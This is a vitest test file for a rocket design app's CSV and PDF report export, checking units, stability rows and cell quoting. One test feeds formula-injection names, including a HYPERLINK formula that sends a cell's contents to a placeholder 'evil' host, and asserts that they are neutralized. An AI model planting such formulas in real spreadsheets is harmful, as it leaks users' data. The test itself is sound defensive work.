import { describe, it, expect } from 'vitest';
import type { StaticInfo } from '../../../src/engine/openRocketEngine';
import type { ReportModel } from '../../../src/services/report/reportModel';
import { buildComponentCsv, buildDesignCsv } from '../../../src/services/report/reportCsv';
import { METRIC_UNITS, IMPERIAL_UNITS } from '../../../src/prefs/units';
import { summaryRows, type PdfPage } from '../../../src/services/report/pdfPage';
import i18n from '../../../src/i18n';

const info = {
  length: 0.9,
  // Shorter than `length`, so 30.9 (the engine's figure) and 27.4 (the wrong
  // (cp - cg) / length) are distinguishable in the assertion below.
  lengthAerodynamic: 0.8,
  refDiameter: 0.079,
  mass: 4.25,
  massEmpty: 3.43,
  cg: 1.382,
  cgEmpty: 1.244,
  cp: 1.629,
  cna: 26.42,
  stabilityCalibers: 3.14,
  stabilityPercent: 30.9,
  rollInertia: 0.0054,
  pitchInertia: 1.83,
  cd: 1.115,
} as unknown as StaticInfo;

const model: ReportModel = {
  name: 'Fireball',
  stages: [{ type: 'stage' }, { type: 'stage' }] as never,
  whole: { label: 'Fireball', info },
  stageSummaries: [
    { label: 'Sustainer', info },
    { label: 'Booster', info },
  ],
  configs: [],
  partsByStage: [],
  finSetsByStage: [{ stage: 'Sustainer', sets: [{ name: 'Fin set', topX: 1.118, bottomX: 1.271 }] }],
};

describe('design CSV', () => {
  const csv = buildDesignCsv(model, METRIC_UNITS);
  const rows = csv
    .trimEnd()
    .split('\r\n')
    .map((l) => l.split(','));

  it('starts with the Scope/Field/Value/Unit header', () => {
    expect(rows[0]).toEqual(['Scope', 'Field', 'Value', 'Unit']);
  });

  it('has the Design block', () => {
    expect(rows).toContainEqual(['Design', 'Name', 'Fireball', '']);
    expect(rows).toContainEqual(['Design', 'Design Type', 'Original Design/Other', '']);
    expect(rows).toContainEqual(['Design', 'Stages', '2', '']);
  });

  it('has the Rocket summary in the chosen units with dot decimals', () => {
    expect(rows).toContainEqual(['Rocket', 'Length', '90', 'cm']);
    expect(rows).toContainEqual(['Rocket', 'Stability (on pad)', '3.14', 'cal']);
    // The kernel's own figure. (cp - cg) / length would be 27.4: right shape,
    // wrong denominator. Pinning it is what keeps that formula out.
    expect(rows).toContainEqual(['Rocket', 'Stability (%)', '30.9', '%']);
    expect(rows).toContainEqual(['Rocket', 'CP', '162.9', 'cm']);
    expect(rows).toContainEqual(['Rocket', 'Normal-Force Slope (CNα)', '26.42', '/rad']);
  });

  it('converts values and names the unit when the preference is imperial', () => {
    const imp = buildDesignCsv(model, IMPERIAL_UNITS)
      .trimEnd()
      .split('\r\n')
      .map((l) => l.split(','));
    // 0.9 m = 35.433 in; 4.25 kg = 149.914 oz.
    expect(imp).toContainEqual(['Rocket', 'Length', '35.433', 'in']);
    expect(imp).toContainEqual(['Rocket', 'Mass (Loaded)', '149.914', 'oz']);
  });

  it('emits a summary block per stage', () => {
    expect(rows).toContainEqual(['Sustainer', 'Length', '90', 'cm']);
    expect(rows).toContainEqual(['Booster', 'Length', '90', 'cm']);
  });

  it('emits fin-set root positions per stage', () => {
    expect(rows).toContainEqual(['Sustainer', 'Fin set: Nose to top of fin root', '111.8', 'cm']);
    expect(rows).toContainEqual(['Sustainer', 'Fin set: Nose to bottom of fin root', '127.1', 'cm']);
  });

  it('quotes a value containing a comma', () => {
    const c = buildDesignCsv({ ...model, name: 'Big, Rocket' }, METRIC_UNITS);
    expect(c).toContain('Design,Name,"Big, Rocket",');
  });

  // `model.name` is the <name> of an imported .ork, so it is untrusted: share
  // someone a design and its name lands in a cell of the CSV they export.
  // Excel and Sheets execute a cell that leads with = + - @.
  it.each(['=HYPERLINK("http://evil/?"&A1,"Open")', '+1+1', '-1+1', '@SUM(A1)'])(
    'neutralizes a formula-triggering design name: %s',
    (name) => {
      const c = buildDesignCsv({ ...model, name }, METRIC_UNITS);
      const value = c
        .split('\r\n')
        .find((l) => l.startsWith('Design,Name,'))!
        .slice('Design,Name,'.length);
      // Leads with an apostrophe, so the spreadsheet takes the cell as text.
      // Quoting is separate and only kicks in for delimiters, so accept either
      // `'=…` or `"'=…"`.
      expect(value.replace(/^"/, '').startsWith("'")).toBe(true);
    },
  );

  it('quotes a bare CR, which would otherwise split the record', () => {
    // The file's own terminator is \r\n, so an unquoted lone \r reads as a row
    // break to an RFC-4180 parser.
    const c = buildDesignCsv({ ...model, name: 'One\rTwo' }, METRIC_UNITS);
    expect(c).toContain('"One\rTwo"');
  });
});

/**
 * Every whole-rocket statistics table lists the same rows: the .ork
 * <designinfo> block, this CSV and the PDF. A finless design has no defined CP,
 * so OpenRocket omits CP, both stability rows and CNα, and a design with no
 * reference diameter has no fineness. The CSV omits the same rows, rather than
 * writing them (fineness as 0) where the .ork written beside it has none.
 */
describe('design CSV rows for a finless design', () => {
  const finless = { ...info, cna: 0, refDiameter: 0 } as StaticInfo;
  const csv = buildDesignCsv({ ...model, whole: { label: 'F', info: finless }, stageSummaries: [] }, METRIC_UNITS);
  const fields = csv
    .split('\r\n')
    .map((l) => l.split(',')[1])
    .filter(Boolean);

  it('omits what OpenRocket omits, as the .ork designinfo does', () => {
    for (const f of ['CP', 'Stability (on pad)', 'Stability (%)', 'Normal-Force Slope (CNα)', 'Fineness (L/D)']) {
      expect(fields).not.toContain(f);
    }
    expect(fields).toContain('Length');
    expect(fields).toContain('Roll Inertia (Loaded)');
  });
});

describe('PDF summary rows', () => {
  const page = { t: i18n.getFixedT('en'), units: METRIC_UNITS } as unknown as PdfPage;

  it('carries the inertia rows the CSV and the .ork carry', () => {
    const labels = summaryRows(page, info).map(([l]) => l);
    expect(labels).toContain(i18n.t('stats.pitchInertia'));
    expect(labels).toContain(i18n.t('stats.rollInertia'));
  });

  it('omits CP and stability for a finless design', () => {
    const labels = summaryRows(page, { ...info, cna: 0 } as StaticInfo).map(([l]) => l);
    expect(labels).not.toContain(i18n.t('report.cp'));
    expect(labels).not.toContain(i18n.t('report.stabilityCal'));
  });
});

describe('buildComponentCsv', () => {
  const parts: ReportModel = {
    ...model,
    partsByStage: [
      {
        stage: 'Sustainer',
        rows: [
          {
            depth: 0,
            type: 'nosecone',
            name: 'Nose',
            material: 'Polystyrene',
            density: 1050,
            length: 0.1,
            outerR: 0.0125,
            mass: 0.012,
          },
          {
            depth: 1,
            type: 'bodytube',
            name: '=HYPERLINK("x")',
            length: 0.3,
            outerR: 0.0125,
            innerR: 0.012,
            thickness: 0.0005,
            mass: 0.02,
          },
        ],
      },
    ],
  };
  const csv = (units = METRIC_UNITS) =>
    buildComponentCsv(parts, units, (type) => ({ nosecone: 'Nose cone', bodytube: 'Body tube' })[type] ?? type)
      .trimEnd()
      .split('\r\n');

  it('writes one row per part, in the chosen units, the header naming them', () => {
    const [head, nose] = csv();
    expect(head).toBe(
      'Stage,Depth,Type,Name,Material,Density (g/cm³),Length (cm),Outer diameter (cm),Inner diameter (cm),Thickness (cm),Mass (g)',
    );
    const cells = nose!.split(',');
    expect(cells.slice(0, 5)).toEqual(['Sustainer', '0', 'Nose cone', 'Nose', 'Polystyrene']);
    // A radius in the model is a diameter in the file: 12.5 mm is 2.5 cm across.
    expect(Number(cells[7])).toBeCloseTo(2.5, 6);
    // A figure the part does not have is blank.
    expect(cells[8]).toBe('');
  });

  it('keeps a part name from becoming a spreadsheet formula', () => {
    const tube = csv()[2]!;
    expect(tube).toContain("'=HYPERLINK");
  });
});
